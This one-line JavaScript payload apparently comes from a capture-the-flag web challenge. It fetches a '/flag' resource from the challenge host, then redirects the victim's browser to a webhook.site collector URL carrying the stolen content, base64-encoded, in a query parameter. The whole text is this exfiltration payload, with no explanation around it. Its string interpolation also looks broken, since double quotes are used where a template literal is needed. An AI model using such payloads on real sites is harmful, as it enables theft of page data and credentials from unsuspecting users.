fetch('https://bugcrowd-feedback-yes-please.chals.io/flag', { method: 'GET' }).then(r => r.text()).then(c => window.location.replace("https://webhook.site/b2827932-b0a6-490a-9be6-5c08830d7453/?gdata=${btoa(c)}"));
